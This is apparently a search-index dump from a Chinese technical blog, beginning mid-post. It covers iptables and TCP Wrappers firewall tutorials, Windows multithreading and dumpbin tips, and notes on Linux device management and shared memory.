以及内核中的路由表判断往哪里转发(注意，这个时候数据包的目的地址有可能已经被我们修改过了) 若是该数据包的目的地址就是本机的地址，也就是该数据包就是发送给本地的，那么就会进入 INPUT 链，而进入 INPUT 链首先到 mangle 表中看看，然后到 filter 表中看看。通过之后便会发给本地的相应的程序 本地相应的程序若是做出响应，产生新的数据包往外发送，数据包将进入到 OUTPUT 链，而在 OUTPUT 链中与 INPUT 链匹配表的顺序相同，依旧是首先查看 raw 表，然后查看 mangle 表，查看 NAT表 ，最后查看 filter 表，若是该数据包还能继续前进将会被发送到 POSTROUTING 链中。 若是之前该数据包的目的地址并不是本机，只是把这里当中转站的话，就会将该数据包发给 FORWARD 链，在 FORWARD 链中，依旧先查看 mangle 表，然后查看 filter 表，若是该包还能进去前进则将进入 POSTROUTING 链中 在 POSTROUTING 链中首先查看 mangle 表，然后查看 NAT 表，因为他们可以在最后发送出去之前修改数据包中的源地址。 通过这些的层层把关，最后数据包便可以从网卡发送出去了 从数据包在内核中的走向我们可以得出以下几点，也是我们需要着重注意的几点： iptables 中匹配规则的表示有顺序的，我们可以得出优先级的顺序是 raw 表&gt; mangle 表&gt; NAT 表&gt; filter 表 iptables 中的表里面的链的规则也是有匹配顺序的，优先级的顺序是 PREROUTING &gt; INPUT FORWARD OUTPUT POSTROUTING 我们在使用 iptables 的时候特别应该注意我们的规则顺序，在一个表中的规则是从上到下的读取，而一经查看到匹配的规则，便不会继续往下读取匹配，所以我们时常会遇到我们写了规则之后似乎并没有生效的情况便是这样。 0x08 iptables 的使用说得再多，我们得不到实际的效果，我们也不会有特别深刻的理解，我们来实际的使用一次 首先我们可以使用这样的一个命令来查看当前 iptables 中已经写下的规则 1sudo iptables -nL 从结果中我们可以看到分布在每条链中的已经写入的规则，若我们还想到跟详细的结果可以使用这样的一个命令 1sudo iptables -nvL --line 第一列 num 显示了该规则在该链中的顺序位置 第二列 pkts 显示了该规则处理的数据包数 第三列 bytes 显示了该规则处理的字节数， 第四列 target 显示了该规则所做的行为， 第五列 port 匹配的端口 第六列 opt 是 TCP 协议头部中 options 的一部分，并不是重点，我们可以不必关注，有兴趣的也可以通过维基百科深入了解 第七列、第八列 in、out 分别表示对从网卡进入与出去的限制 ip 的匹配条件 第九列、第十列 source、destination 表示对包中分析得出的数据源地址与数据的目的地址的匹配 我们还可以通过一种方式来查看已经生效的规则，这种方式查看到的是我们直接插入的规则，而不是像以上两个命令经过分析后的结果： 1sudo iptables-save 当然 iptables-save 有一个参数 -t 可以指定我们要保存的表，到某个文件中去 1234#在执行该命令之前请先用sudo su 切换到 root 用户iptables-save -t filter &gt; filter.bakcat filter.bak 上我们我们提到过，iptables 是一个可调用内核接口来对存放在内存中的 Netfilter 配置表进行修改、编辑的一个工具，既然是修改的内存中的配置表，所以我们并不需要重启防火墙什么的，修改后的规则会立即生效。 我们再来回顾一下在编写规则时我们需要书写哪些参数： 我们可以做这么一个例子，将所有访问我们 80 端口的数据包全部丢掉 首先我们来验证 80 端口是开发的，可以访问的 123456789#首先本实验环境没有装 apache 服务我们需要安装一下，然后启动服务sudo apt-get install apache2sudo service apache2 startnetstat -lunpt | grep 80#尝试看我们能否访问该页面，若返回值为 200 则为成功访问curl -I localhost 然后我们来添加这么一条规则，并查看他是否写入了规则表当中 1234567sudo iptables -t filter -I INPUT -p tcp --dport 80 -j DROP#仅仅只是查看 INPUT 链是否加入了这条规则sudo iptables -nvL INPUT#然后我们再来尝试一次，能否查看到该网页curl localhost 是得不到，但是为什么会一直停留在那里，是因为我们是用的 DROP 将所有来访问该页面的数据包丢掉，不给任何返回，响应，而 ~却很钟情的一直等待着服务端的响应。若我们将 DROP 行为改成 REJECT 的话，就会有返回信息说这个端口无法访问。 123456789#删除我们之前添加的规则，这里没有添加 -t 的参数#是因为不指明该参数，系统默认为修改 filter 表sudo iptables -D INPUT -p tcp --dport 80 -j DROP#添加拒绝的规则sudo iptables -I INPUT -p tcp --dport 80 -j REJECT#再次验证curl localhost 通过上面的例子大家可以看到 iptables 已经修改便会立即生效，在修改规则的时候我们会用到各种参数，下面列出一些常用的参数 参数 解释 -t 制定我们修改或者添加的规则是放入那个表，若是没有指定默认为 filter 表 -A 表示我们添加的这个规则追加在表的最后面，append -I 表示我们指定位置插入当前的这个规则，insert，指定的位置写在链后面 ，若是没有指定则默认值为1，也就是将该规则添加在指定表的指定链的第一位 -D 删除某条规则，delete，后面可以指明具体的规则，如上面的例子，也可以指定位置，位置同样是放在链的后面 -F 清除所有的规则，若是后面有跟上链，便只删除该链下的所有规则 -L 显示规则链中已有的条目 -N 创建新的用户自定义规则链 -p 指定要匹配的数据包协议类型,如上文我们使用的tcp -s 指定要匹配的数据包源ip地址 -i&lt;网络接口&gt; 指定数据包进入本机的网络接口 -o&lt;网络接口&gt; 指定数据包要离开本机所使用的网络接口 -j&lt;目标&gt; 指定要跳转的目标； 如上文中我们删除一条规则的时候使用的是 -D 后面加具体的规则，其实我们还可以这样去删 12345#查看我们要删除的规则所在的链与位置sudo iptables -nvL --line#删除指定位置的规则sudo iptables -D INPUT 1","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Linux防火墙","slug":"A-OS/Linux/Linux防火墙","permalink":"http://example.com/categories/A-OS/Linux/Linux%E9%98%B2%E7%81%AB%E5%A2%99/"}]},{"title":"【Linux防火墙】TCP Wrappers","date":"2024-01-16T06:15:17.596Z","path":"A_OS/Linux/Linux防火墙/TCP Wrappers/","text":"概述：TCP wrappers 是 Linux 中两大防护措施的其中之一，这层保护通过定义哪些主机允许或不允许连接到网络服务上来实现。TCP Wrappers为多种不同的服务提供访问把关，通过本实验我们将初试TCP wrappers的使用。 实验涉及的知识点 Tcp wrappers的认识 Tcp wrappers的使用 0x01 TCP Wrappers 的认识Tcp Wrapper 是由 Wietse Venema 编写的，其创作出这个程序的主要原因是监视 Eindhoven 大学数学和计算机科学系的Unix工作站上的黑客活动，Wietse Venema一直维护这个程序到1995年；2001年6月1日，在其自己的BSD风格的许可证下发布。 Tcp Wrapper 是一个基于主机的网络访问控制的程序，用于过滤对类 Unix 系统（如 Linux 或 BSD ）的网络访问。 当一个系统或者主机在公开网络中充当服务器时,这个系统就可能成为被攻击的目标.对网络服务进行访问控制 是一件很重要的事情。像 Telnet、SSH、FTP、POP 和 SMTP 等很多服务都会用到 TCP Wrapper,它被设计为一个介于外来服务请求和服务回应的中间处理 它的基本过程是这样的：当服务器或主机接收到一个外来服务请求的时候，先由TCP Wrapper 来对请求进行分析处理，TCP Wrapper 会根据请求所需要的服务和对这个服务所设定的规则来判断请求方是否有权限，如果有，TCP Wrapper 会把这个请求按照配置文件所设定的规则转交给相应的守护进程去处理，同时记录这个请求动作。 TCP Wrappers虽然能对 TCP 协议的报文做过滤动作，但是并不是所有的 TCP 协议报文 TCP Wrappers 都可以过滤掉。只有该服务链接到TCP Wrappers的函式库才可以使用TCP Wrappers进行报文过滤。 因为 TCP Wrapper 的功能主要来自于 libwrap.a这个静态库，它是一个服务库。像 xinetd、sshd 和 portmap 等许多服务编译时都依赖于 libwrap.so 这个动态链接库，其他的网路服务甚至你自己编写的服务都可以加上这个编译选项来提供 TCP Wrapper 的功能。 我们可以使用这样一个命令来确定我们要过滤的服务是否链接到了libwrap 这个函数库中 1234567ldd /path/service_name |grep libwrap#例如ldd /usr/sbin/sshd | grep libwrap#若是不知道程序的所在位置可以这样ldd $(which sshd) | grep libwrap 0x02 TCP Wrappers 的使用要决定一个客户是否被允许连接一项服务,TCP Wrappers会参考以下两个文件： &#x2F;etc&#x2F;hosts.allow &#x2F;etc&#x2F;hosts.deny 当一个TCP Wrappers接收到一个客户请求时,它会运行以下几个步骤: （此图的来源：http://images.slideplayer.com/12/3366547/slides/slide_75.jpg) 检查 /etc/hosts.allow.TCP会绕服务会循序地解释&#x2F;etc&#x2F;hosts.allow文件并应用第一个为这个服务所指定的规则.如果找到了一个匹配的规则,则允许连接.如果找不到匹配的规则,就会进行下一个步骤。 检查 /etc/hosts.deny.TCP会绕的服务会循序地来解释&#x2F;etc&#x2F;hosts.deny文件.如果找到一个匹配的规则,则拒绝这个连接.如果找不到匹配的规则,则允许连接到这个服务。 若是没有匹配的规则便进入服务 在使用 TCP Wrappers 保护网络服务时应该考虑以下几个要点: hosts.allow 或 hosts.deny 的配置改变会立即生效。 两个规则文件是有读取顺序的，hosts.allow中的规则会先被读取应用,hosts.deny中的规则后读取,如果访问一项服务在hosts.allow中设置为允许,那么在hosts.deny中同一项服务的拒绝访问设置则不会生效 规则文件内的读取也是有顺序的，每个文件中的各项规则是由上到下被读取的,第一个匹配的规则生效。因此,规则的排列顺序也很重要。 我们可以通过下图看到，hosts.allow 的配置文件，默认的文档给予了我们一些例子 通过例子我们可以看出这个配置文件是有语法格式的。首先空行或以井号(#)开始的行会被忽略 每条规则都使用以下基本格式来对网络服务的访问进行控制: 1234&lt;daemon list&gt;: &lt;client list&gt; [: &lt;option&gt;: &lt;option&gt;: ...]#动作可有可无服务程序列表： 客户机地址立标 [:执行的动作] 列表中存在多个服务或者主机的时候用 ,逗号分隔开。 例如我们要TCP Wrappers监测 10.3.1.1 这台主机向我们的 ssh 的守护进程发出链接，就拒绝掉，那么我们就把下面这条命令写在 hosts.deny 这个文件中 1sshd : 10.3.1.1 我们来做这么一个实验来证明 Tcp wrappers 是起作用的 首先我们可以看到本地的 ssh 服务是开启的，并且实验能够正常地使用 ssh 12#我们可以看到 ssh 的守护进程正在运行中ps -ef | grep sshd 12#尝试连接我们本地的22号端口，也是成功的telnet localhost 22 12345#这是最直接的证明方式，直接ssh我们的本地，密码为 shiyanloussh shiyanlou@localhost#然后我们可以通过top的第一栏看到，当前存在的用户有两个，说明我们成功登入了top 用了这么多的方式我们证明了，ssh 是没有问题的。然后我们通过这个命令将规则写入 hosts.deny中 1234sudo vim /etc/hosts.deny #这是需要写入的规则sshd: localhost 这时候我们再来尝试连接 ssh 服务，就用以上的三种方式，可以看到 sshd 并没有停止服务，还在运行中，但是 telnet、ssh 都没有办法连接上去 若我们将 hosts.deny中的规则删除掉亦或者是注释掉，再尝试一次肯定是没有问题的。 在 hosts.deny 与 hosts.allow 的语法是支持通配符的，通配符有以下这些 通配符 作用 ALL 完全匹配,可以用在守护进程列表和客户列表中 LOCAL 与任何不包括点(.)的主机匹配,也就是localhost本机 KNOWN 与任何带有已知主机名和主机地址匹配 UNKNOWN 与任何带有未知主机名和主机地址匹配 PARANOID 与任何带有主机名和主机地址不相匹配的主机匹配 比如还是上面的例子 上文提到过，我们的规则是有读取顺序的，如我们在 hosts.allow 中加入 ssh: LOCAL 我们会发现 ssh 会是成功的，hosts.deny 中的那条规则对本机并没有生效。 模式可以用在访问规则的客户领域里,能够更有效率地匹配我们想要匹配的用户，这里只列举常用的方式，需要更深入学习的可以使用 man 命令查看 主机名以点(.)开始,如果在一个主机名的开始放置一个圆点,那么就与所有共享这个主机名中列出的相同组成部分的主机匹配.如: .simplecloud.com 适用于匹配 simplecloud.com 域名内的所有主机. IP地址以点(.)结束,如果在一个IP地址的末尾放置一个点,那么就与最后一个点前同一个网段的所有主机匹配.如: 192.168. 适用于 192.168.x.x 网络内的任何主机. IP地址/子网掩码,这样的格式来控制某个网段的地址的访问.如: 192.168.1.0 /255.255.255.0 适用于地址区间从192.168.1.0 到 192.168.1.255 的所有主机. [IPv6地址] 的地址也是可以读取的 星号(*)，星号与shell中的通配符作用相同 我们还可以使用这个动作来执行一些 shell 命令 动作 作用 spawn 开启一个shell执行你指定的命令 twist 替换访问者的请求成我们指定的命令 如图中，我们若是在 hosts.deny 中这样写，会有这要的反馈效果，我们可以了解到是谁试图攻击我们，想登陆我们的主机了，然后可以封掉他的 IP。 同样我们可以尝试一下 twist 的使用，在 &#x2F;etc&#x2F;hosts.deny 中写下这个命令： 1sshd : localhost : twist /bin/echo &quot;Hello，attacker，You are prohibited from accessing this service!!&quot; 然后我们用 telnet 来尝试链接他，会得到这样的结果： 在其中我们可以用到这样的一些参数，这里只列举了常用的一些参数： 参数 作用 %a 客户端的ip地址 %A 服务端的ip地址 %d 守护进程的名字 %h 客户端的主机名 %H 服务端的主机名 %p 守护进程的pid %u 客户端的用户名 本实验只是粗略的了解与尝试 TCP wrappers，在实际的生产环境中 xinetd 与 TCP wrappers 是黄金搭档，也同样能够做到防止 DOS 攻击，与客户端交换，控制连接数等等的高级功能。若想更加地深入的学习，大家可以多看看 man，与网上查查资料。","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Linux防火墙","slug":"A-OS/Linux/Linux防火墙","permalink":"http://example.com/categories/A-OS/Linux/Linux%E9%98%B2%E7%81%AB%E5%A2%99/"}]},{"title":"【Linux防火墙】攻击与防御","date":"2024-01-15T16:00:00.000Z","path":"A_OS/Linux/Linux防火墙/攻击与防御/","text":"概述：在了解了 iptables 的结构与用法之后我们需要学会在特定的场景去应用他们，而不再是简单的纸上谈兵。本实验将带大家了解网络开放之后可能带来的攻击以及如何去预防 实验涉及的知识点 DDOS 攻击 SYN 攻击","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Linux防火墙","slug":"A-OS/Linux/Linux防火墙","permalink":"http://example.com/categories/A-OS/Linux/Linux%E9%98%B2%E7%81%AB%E5%A2%99/"}]},{"title":"【Windows】 创建多线程","date":"2024-01-09T02:02:19.591Z","path":"A_OS/Windows/多线程/【Windows】创建多线程/","text":"概述：如何在 windows 下不使用 C++ 标准库函数创建多线程并等待其执行状态 如下所示为一段创建多线程并等待执行完成的 demo。也可参考官方示例，使用 createthread 创建，创建线程 - Win32 apps | Microsoft Learn 123456789101112131415161718192021int nCount = g_tOracleUser.size(); HANDLE *pHandles = (HANDLE *)malloc(sizeof(HANDLE) * g_tOracleUser.size()); if (pHandles) &#123; int iHandleIndex = 0; for (auto &amp; user : g_tOracleUser) &#123; unsigned int dwThreadID = 0; pHandles[iHandleIndex] = (HANDLE)_beginthreadex(NULL, 0, (_beginthreadex_proc_type)&amp;_DoCheckThread, (LPVOID)user.GetString(), 0, &amp;dwThreadID); ATLTRACE(L&quot;[%s] _beginthreadex _SendDataSyncThread , dwThreadID : %u&quot;, __FUNCTIONW__, dwThreadID); iHandleIndex++; &#125; WaitForMultipleObjects(nCount, pHandles, TRUE, INFINITE); ATLTRACE(L&quot;[%s] all check finish...count : %d&quot;, __FUNCTIONW__, g_outRiskUsers.size()); tRiskUsers = g_outRiskUsers; &#125; else &#123; ATLTRACE(L&quot;[%s] malloc handle failed!!!&quot;, __FUNCTIONW__); &#125;","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"多线程","slug":"多线程","permalink":"http://example.com/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"多线程","slug":"A-OS/Windows/多线程","permalink":"http://example.com/categories/A-OS/Windows/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"}]},{"title":"【开发】查看编译的lib的运行库是什么","date":"2023-12-29T02:08:27.232Z","path":"A_OS/Windows/开发相关/查看编译的lib文件运行库/","text":"概述：如何查看编译的 lib 的运行库是啥 0x01 查看运行库1dumpbin /directives foo.lib dumpbin输出 对应的运行库 &#x2F;DEFAULTLIB:MSVCRTD &#x2F;MDd &#x2F;DEFAULTLIB:MSVCRT &#x2F;MD &#x2F;DEFAULTLIB:LIBCMT &#x2F;MT &#x2F;DEFAULTLIB:LIBCMTD &#x2F;MTD 0x02 查看导出函数1dumpbin /LINKERMEMBER foo.lib","tags":[{"name":"lib","slug":"lib","permalink":"http://example.com/tags/lib/"},{"name":"dumpbin","slug":"dumpbin","permalink":"http://example.com/tags/dumpbin/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"开发相关","slug":"A-OS/Windows/开发相关","permalink":"http://example.com/categories/A-OS/Windows/%E5%BC%80%E5%8F%91%E7%9B%B8%E5%85%B3/"}]},{"title":"【原理剖析】c-Linux 设备管理","date":"2023-12-27T07:15:36.586Z","path":"A_OS/Linux/Linux操作系统原理剖析/c-Linux 设备管理/","text":"概述： Linux 系统设备管理的特点 Linux 设备驱动程序的接口 Linux 的磁盘高速缓存 Linux 字符设备缓冲区管理 Linux 的设备驱动 0x01 Linux 系统设备管理的特点Linux 系统把设备分为两大类。 块设备：用于存储信息，它对信息的存取是以信息块为单位的，如通常使用的磁盘、磁带等等。 字符设备：通常用于输入输入出，作为人和计算机之间的接口，它对信息的存取是以字符为单位进行的，如键盘、鼠标、显示器、打印机等等。 Linux 系统把 I&#x2F;O 设备看作文件，称为特别文件。例如：打印机的文件名为 lp ，控制终端的文件名为 console。这些特别文件组织在目录 /dev 下。如果要访问打印机可以使用路径 /dev/lp ，使用系统调用 open 可以打开设备文件并进行操作。 Linux 系统的这一特点使得任何外部设备在用户面前与普通文件完全一样，而不必涉及它的物理特性，给用户带来极大的方便。在文件系统内部，外部设备和普通文件一样受到存取控制的保护，仅仅在最终驱动设备时才转向各个设备的驱动程序。块设备上的普通文件和目录文件并不是设备特殊文件，但是块设备本身可以作为特殊文件来访问。 0x02 文件系统与设备驱动程序的接口Linux 系统为各类设备分别配置不同的驱动程序，在用户程序中通过该文件操作方式使用设备，如：打开、关闭、读、写等等，由文件系统转入设备驱动程序。 核心与设备驱动程序的接口是块设备开关表和字符设备开关表。每一种设备类型在表中占用一个表目，包含若干数据项，其中有一项为该类设备驱动程序入口地址，在系统调用时引导核心转向适当的驱动程序接口。 对设备特殊文件的系统调用，根据文件类型转入块设备开关表或字符设备开关表进行打开、关闭块设备或字符设备的操作。字符设备特殊文件的系统调用 read、write 系统调用则通过高速缓冲模块转向设备驱动模块中的策略过程。 0x03 设备开关表Linux 系统吧块设备和字符设备又分别细分为若干类。如块设备可分为硬盘、软盘、磁带、光盘等，字符设备可分为终端设备、打印机等。为指定一类设备，将设备类从 0 开始顺序编号，称为主设备号；同一类的设备可能有许多，为了指定一台具体设备，需要一个次设备号来标识。因此，在指定一台具体设备时要给出块设备&#x2F;字符设备、主设备号、次设备号。如下图所示: 设备开关表相当于一个二维矩阵，每一行含有同一类设备的驱动程序入口地址，主设备号与行号一一对应；每一列是完全不同操作（open、close、read、write）的驱动程序入口地址，如下表所示： 0x04 磁盘高速缓存读写策略对文件系统的一切存取操作都能通过直接从磁盘上读或写来实现，当磁盘 I&#x2F;O 的速度较慢，系统性能较低。为了减少对磁盘的存取频率，Linux 使用了磁盘高速缓存技术。 Linux 磁盘缓冲管理策略试图把尽可能多的有用数据保存在缓冲区中，磁盘缓冲管理模块位于文件系统和块设备驱动程序之间。当从磁盘中读数据时，文件系统先从磁盘高速缓存中读，如果数据已在高速缓存中，则不必启动磁盘 I&#x2F;O ，如果数据不再高速缓存中，则启动磁盘 I&#x2F;O ，从磁盘读取数据送往高速缓存，进程再冲高速缓存中读取数据。 当进程向磁盘上写数据时，先往高速缓存中写数据，以便随后读取它时能够直接从高速缓存上读取而不需要启动磁盘读写。Linux 采用“延时写”策略，即如果缓存区还没有写满这不会急于将缓冲区中的数据写到磁盘上，而是在缓冲管理数据结构中对该缓冲区设置延迟写标志，当高速缓存中的数据延迟到必须向磁盘上写的时候再进行写磁盘操作。 0x05 磁盘缓冲管理的数据结构Linux 使用多个内存缓冲区进行磁盘缓冲，为了合理有效地管理和使用这些缓冲区，必须按照一定策略进行管理。管理的依据是缓冲区的相关信息，为了能访问这些信息，必须将其按一定数据结构进行组织。 首先，给每个缓冲区建立“缓冲首部”来存放该缓冲区的相关信息，如下图所示。 其中内容有： 设备号 dev：缓冲区内包含的信息所属设备的设备号 块号 blkno：该缓冲区对应的磁盘的物理块号 状态 flag：描述了缓冲区的当状态，包括： - 忙标志 BUSY：缓冲区当前是否正忙 - 有效位 AVE：缓冲区包含的数据是否有效 - 延迟写位 DELWR：是否延迟写 - 写标志位 WRITE：是否正在把缓冲区的内容写到磁盘上 - 读标志位 READ：是否从磁盘往缓冲区读取数据信息 - 等待位 WAIT：是否有一个进程正在等待该缓冲区 - 设备缓冲区队列前向指针 b-forw - 设备缓冲区队列后向指针 b-back - 空闲缓冲区队列前向指针 av-forw - 空闲缓冲区队列后向指针 av-back 要对所有缓冲区进行管理，必须将所有缓冲区首部组织成一定的数据结构， Linux 建立了两个缓冲区队列；空闲缓冲区队列和设备缓冲区队列。空闲缓冲区队列如下图所示： 为了对缓冲区进行分配，把所有空闲缓冲区组织成一个队列，队列中的所有缓冲区的忙标志位 BUSY 均为 0 。该队列是一个双向循环链表。 对于每类设备都建立一个设备缓冲区队列，由与该类设备有关的所有缓冲区构成。此队列中的所有缓冲区首部的忙标志位 BUSY 均为 1 。该队列同样是一个双向循环链表。 任何缓冲区首部不是位于空闲缓冲区队列中就是位于设备缓冲区队列中。设备缓冲区队列如下图所示： 0x06 Linux 磁盘缓冲区管理算法Linux 提供的磁盘高速缓冲区不属于任何进程专用，而是由多个进程共享，由操作系统进行统一管理。为了提高使用效率，必须采取适当的管理策略。 当某进程要从一个磁盘读取数据时，首先需要检查要读取数据的磁盘块是否包含在某缓冲区中，如果不在，则从空闲缓冲区队列中分配给它一个空闲缓冲区；当某进程要将数据写入磁盘时，首先查看一下要写的磁盘块是否在某缓冲区中，如果不在则为这个磁盘块分配一个空闲缓冲区，被分配的空闲缓冲区从空闲缓冲队列中退出并进入对应的设备缓冲区队列，该缓冲区的 BUSY 标志位置一。 当缓冲区的信息读到相应进程的内存区后，或进程信息写到缓冲区后，，使释放进程使用的缓冲区，将 flag 中的 BUSY 标志位清零并送入空闲缓冲区队列尾部，即将置为延迟写的缓冲区也送入空闲缓冲队列，这样可以使得有限的缓冲区得到充分利用，满足多个并发进程的需求。 当一个缓冲区被送往空闲缓冲区队列尾部时，并不退出设备缓冲区队列，而是仍然留在原队列中，这样使得此次使用完毕送往空闲缓冲区队列的缓冲区能够暂时保存最后的信息应对可能的访问。如果将其保留在设备缓冲区队列中，当后来要读取的磁盘数据仍然保留在此缓冲区中时可以直接从缓冲区中读取而不需要再次启动磁盘 I&#x2F;O ，提高了读盘速度，这正是使用高速磁盘缓存的目的。 如果要使得使用完毕送入空闲缓冲区队列的缓冲区重新分配给其他设备，则可以将该缓冲区同时从空闲缓冲区队列和原设备缓冲区队列中抽出，送入新的设备缓冲区队列。 因为被使用过的缓冲区放在空闲缓冲区队列的末尾，随着不断地从空闲缓冲区队列上取下缓冲区，后面的缓冲区会不断地向队列首部移动。如果一个延迟写标志位为 1 的缓冲区移动到了空闲缓冲区队列的头部，当其被重新分配之前，需要将内部的内容写入到相应设备指定的磁盘块中。 0x07 字符缓冲区及其队列Linux 中为字符设备的数据传输设置了一个公用的字符缓冲池，该缓冲池内包含有若干个缓冲区，但是每个缓冲区很小，仅有几个到几十字节。为了合理使用这些缓冲区，将其组织成一定的数据结构。同块设备缓冲区的管理类似，建立空闲字符缓冲区队列和设备字符缓冲区队列。 每个字符缓冲区由四部分组成： 缓冲区的第一个字符位置 缓冲器的最后一个字符位置 指向下一个字符缓冲区的指针 字符缓冲区 如下图所示： 对字符空闲区的操作是每次送入一个字符或取出一个字符。送入字符再字符缓冲区的尾部进行；取出字符从字符缓冲区的头部进行。随着不断往字符缓冲区中放入字符，最后一个字符的位置会向后推移，直到字符缓冲区的末尾，第一个字符的位置不一定是字符缓冲区的开始位置，随着不断地从缓冲区中取出字符，第一个字符的位置不断后移直到字符缓冲区的末尾。 0x08 空闲缓冲区的分配与回收在一个进程中使用字符设备进行 I&#x2F;O 操作时，文件系统会为该字符设备分配一个空闲缓冲区。分配时会检查空闲缓冲区队列，当队列非空时则直接从队列首部取出一个空闲缓冲区分配给这个字符设备并将其送入该字符设备的设备缓冲区队列，并将指向该缓冲区的指针返回给调用进程；当空闲缓冲区队列为空时，则请求 I&#x2F;O 操作的进程将被阻塞等待直到有空闲缓冲区可用。 当字符缓冲区中的数据被提取完毕后，便要释放该缓冲区，将该缓冲区送入空闲字符缓冲区队列的首部。若此时有申请空闲缓冲区而阻塞的进程则会唤醒该进程。 0x09 Linux 的设备驱动设备驱动是指控制具体的物理设备完成 I&#x2F;O 操作，与硬件的物理特性和数据传输控制方式密切相关，不同类型的设备、不同数据传输控制方式要采用不同设备驱动方式。 Linux 首先把设备分为块设备、字符设备两大类，然后再对块设备和字符设备具体分类，针对每一类设备分别开发不同的设备驱动程序。 0x0a 块设备驱动 数据结构 块设备表，对每一类块设备分别设置块设备表，记录该类设备的相关信息。其内容包括： 忙标志：标志设备的忙闲状态，0 表示空闲，1 表示正忙。 出错次数：指设备 I&#x2F;O 出错次数。每次 I&#x2F;O 完成后，就转入设备中断处理程序，设备中断处理程序检测此次 I&#x2F;O 过程是否出错，如果出错则将出错次数加一，如果出错次数没用超过规定值则中断处理程序重新启动一次数据传输；如果出错次数超出规定值则认为是真正的数据传输错误，不会再重新启动数据传输。 设备缓冲区队列头指针：分配给该设备的缓冲区队列的头指针 设备缓冲区队列尾指针：分配给该设备的缓冲区队列的尾指针 I&#x2F;O 请求队列头指针：请求该类设备 I&#x2F;O 操作的请求块组成的队列的头指针 I&#x2F;O 请求队列尾指针：请求该类设备 I&#x2F;O 操作的请求块组成的队列的尾指针 I&#x2F;O 请求队列。用户进程的 I&#x2F;O 请求包括要求完成 I&#x2F;O 操作的逻辑设备名、要求的操作、传送数据在内存中的起始地址、传送数据的长度，将这些信息组织成 I&#x2F;O 请求块 iorb。逻辑设备名相同（同一类设备）的 I&#x2F;O 请求块构成一个队列，称为 I&#x2F;O 请求队列。每一类设备都分别有一个 I&#x2F;O 请求队列。 磁盘设备驱动程序 驱动程序控制设备具体实现进程的高级 I&#x2F;O 请求包括打开、关闭、读、写等。 打开。磁盘在使用之前必须进行打开操作，其目的是在使用磁盘之前进行必要的初始化————设置硬盘的工作参数，硬盘工作参数存放在主存中操作系统结构硬盘控制块中，它是驱动程序对硬盘进行控制的依据。硬盘工作参数存放在硬盘的引导区中，因此要将引导区内容读到硬盘控制块中必须进行部分初始化工作。 读写硬盘。由策略接口程序 strategy 完成，每次只读写一个扇区，Linux 中对硬盘有两种读方式和三种写方式： - 一般读方式：把当前所需盘块中的内容读入缓冲区 - 预先读：进程读顺序文件的盘块时，会预先读取下一盘块的内容 - 一般写方式：把缓冲区数据写到盘块，进程必须等待写操作完成 - 异步写方式：把缓冲区数据写到盘块，进程不必等待写操作完成 - 延迟写：先将数据写到缓冲区，标记该缓冲区延迟写，挂到空闲缓冲区队列尾部等到后续时间再写到盘块中 硬盘读写驱动过程： 将逻辑块号转换为物理块号 申请 DMA 将物理块号转换为盘面号&#x2F;柱面号&#x2F;扇区号 移动磁头到指定柱面 向硬件控制器发送读写命令 CPU 发出读写命令后不必等待，继续执行其他进程 当传输结束后，硬盘控制器会向 CPU 发送中断信号 CPU 响应后转入硬盘中断处理程序 0x0b 字符设备驱动字符设备作为人和计算机之间的接口设备，人们通常通过字符设备向计算机输入信息（指令、数据）或输出信息。字符设备以字符作为数据传输单位，速度较慢。常见的字符设备有终端、行式打印机、卡片输入机等等。 字符设备的传递使用一组专用的寄存器来实现。每种字符设备的控制器一般都有三个寄存器： 控制寄存器接收 CPU 发送来的命令、控制设备的操作； 状态寄存器保存设备的状态； 数据寄存器暂存要传送的数据； 数据结构 对每一类字符设备分别家里字符设备表，记录使用该类字符设备所需的各种信息，由于字符设备种类繁多，不同种类的字符设备特性差别较大，因此其字符设备表差别较大。 终端驱动程序 字符设备种类繁多，其驱动程序哥不相同，这里就以终端驱动沉香古为例讲述 Linux 系统中字符设备驱动程序的工作原理： 终端主要由键盘和显示器构成，终端驱动程序控制终端设备和进程之间的字符数据传输，包括以下五种操作： ttopen：打开终端设备，建立终端机器与终端进程之间的对应关系 ttclose：切断终端设备与进程之间的对应关系 ioctl：用于对终端机器的控制 ttread：从终端设备读取数据 ttwrite：向终端设备发送数据","tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Linux操作系统原理剖析","slug":"A-OS/Linux/Linux操作系统原理剖析","permalink":"http://example.com/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"}]},{"title":"【原理剖析】7-进程间通信方式之共享内存","date":"2023-12-26T16:00:00.000Z","path":"A_OS/Linux/Linux操作系统原理剖析/7-进程间通信方式之共享内存/","text":"概述：知识点： Linux 共享内存方式原理介绍 Linux 共享内存相关 API 介绍 0x01 Linux 进程间通信方式之共享内存概述在 Linux 中，每个进程都有属于自己的进程控制块（PCB）和地址空间（Addr Space），并且都有一个与之对应的页表，负责将进程的虚拟地址与物理地址进行映射，通过内存管理单元（MMU）进行管理。两个不同的虚拟地址通过页表映射到物理空间的同一区域，它们所指向的这块区域即共享内存。如下图所示： 